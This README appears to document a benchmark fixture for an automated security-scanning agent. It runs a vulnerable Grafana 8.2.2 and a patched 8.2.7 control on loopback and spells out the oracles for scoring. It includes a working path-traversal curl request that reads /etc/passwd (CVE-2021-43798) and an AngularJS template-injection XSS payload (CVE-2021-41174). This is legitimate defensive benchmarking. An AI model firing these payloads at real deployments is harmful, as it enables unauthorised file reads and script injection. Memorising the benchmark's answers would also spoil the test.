# Grafana 8.2.2: two documented vulnerabilities, one black-box target

This fixture adds a two-class real-product benchmark alongside the original
single-CVE Grafana regression. Grafana 8.2.2 contains two vendor-documented,
locally reproducible issues in this configuration:

| Ground truth | Class | Independent oracle |
| --- | --- | --- |
| [CVE-2021-43798](https://grafana.com/blog/grafana-8-3-1-8-2-7-8-1-8-and-8-0-7-released-with-high-severity-security-fix/) | unauthenticated path traversal / local file read | `/public/plugins/alertlist/` traversal returns a `root:` passwd entry |
| [CVE-2021-41174](https://grafana.com/blog/grafana-8-2-3-released-with-medium-severity-security-fix-cve-2021-41174-grafana-xss/) | unauthenticated path-based XSS | an AngularJS expression on a snapshot URL executes in the browser |

Grafana 8.2.7 is the patched control for both. `2/2` means only that the scan
proved these two CVEs; it is **not** a claim that Grafana 8.2.2 has exactly two
vulnerabilities. Other reports are unclassified pending manual review.

The images are digest-pinned. Grafana containers have only an internal Docker
network, and a capability-dropped ingress exposes them on loopback ports 3310
and 3311. Do not point the oracles or scans at third-party deployments.
Before spending a model request, `xalgorix-bench` checks `/api/health`, requires
HTTP 200, and matches the exact Grafana version fingerprint declared in the
manifest. A swapped, stale, redirected, or unhealthy fixture therefore fails
closed instead of producing a misleading benchmark score.

Validate either fixture without provider credentials or model calls:

```bash
go run ./cmd/xalgorix-bench \
  -manifest benchmarks/real-world/grafana-dual/manifest.json \
  -target-id grafana-8.2.2-two-cves -preflight-only
go run ./cmd/xalgorix-bench \
  -manifest benchmarks/real-world/grafana-dual/manifest.json \
  -target-id grafana-8.2.7-two-cve-control -preflight-only
```

```bash
docker compose -f benchmarks/real-world/grafana-dual/compose.yaml up -d
curl --fail http://127.0.0.1:3310/api/health
curl --fail http://127.0.0.1:3311/api/health
```

Check the file-read oracle without writing target data to disk. The vulnerable
request must print a `root:` line; the fixed request must not:

```bash
curl --path-as-is -fsS \
  http://127.0.0.1:3310/public/plugins/alertlist/../../../../../../../../etc/passwd \
  | grep -m1 '^root:'
curl --path-as-is -sS -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:3311/public/plugins/alertlist/../../../../../../../../etc/passwd
```

For the XSS oracle, use an isolated browser session. This harmless expression
sets a page-local variable instead of opening a dialog. The vulnerable page
must evaluate to `1`; the patched page must evaluate to `null`:

```bash
oracle='/dashboard/snapshot/{{constructor.constructor(%27window.__xalgorixOracle=1%27)()}}?orgId=1'
npx --yes agent-browser@0.37.1 --session grafana-old open "http://127.0.0.1:3310${oracle}"
npx --yes agent-browser@0.37.1 --session grafana-old wait --load networkidle
npx --yes agent-browser@0.37.1 --session grafana-old eval 'window.__xalgorixOracle'
npx --yes agent-browser@0.37.1 --session grafana-fixed open "http://127.0.0.1:3311${oracle}"
npx --yes agent-browser@0.37.1 --session grafana-fixed wait --load networkidle
npx --yes agent-browser@0.37.1 --session grafana-fixed eval 'window.__xalgorixOracle'
npx --yes agent-browser@0.37.1 --session grafana-old close
npx --yes agent-browser@0.37.1 --session grafana-fixed close
```

The same positive/control checks can be rerun without model calls through
opt-in integration tests. Both URLs are validated as loopback HTTP by the
tests:

```bash
XALGORIX_GRAFANA_VULN_URL=http://127.0.0.1:3310 \
XALGORIX_GRAFANA_FIXED_URL=http://127.0.0.1:3311 \
go test ./internal/agent -run TestVerifyPathTraversalGrafanaPair -count=1

XALGORIX_GRAFANA_VULN_URL=http://127.0.0.1:3310 \
XALGORIX_GRAFANA_FIXED_URL=http://127.0.0.1:3311 \
go test ./internal/tools/browser -run TestVerifyXSS_GrafanaPathPair -count=1
```

The agent receives only the target URL and generic assessment instruction, not
the CVE list or source code. The manifest is used after the scan for scoring.
For stability, run each target at least three times; each expected CVE must be
found in every vulnerable run, and neither signature may appear in any fixed
run. JSON evidence is stored privately under project `tmp/`:

```bash
go run ./cmd/xalgorix-bench \
  -manifest benchmarks/real-world/grafana-dual/manifest.json \
  -target-id grafana-8.2.2-two-cves -runs 3 -timeout 15m \
  -result-json tmp/grafana-dual-vulnerable.json
go run ./cmd/xalgorix-bench \
  -manifest benchmarks/real-world/grafana-dual/manifest.json \
  -target-id grafana-8.2.7-two-cve-control -runs 3 -timeout 15m \
  -result-json tmp/grafana-dual-control.json
```

After both scans finish, remove only this fixture's containers and volumes:

```bash
docker compose -f benchmarks/real-world/grafana-dual/compose.yaml down -v
```
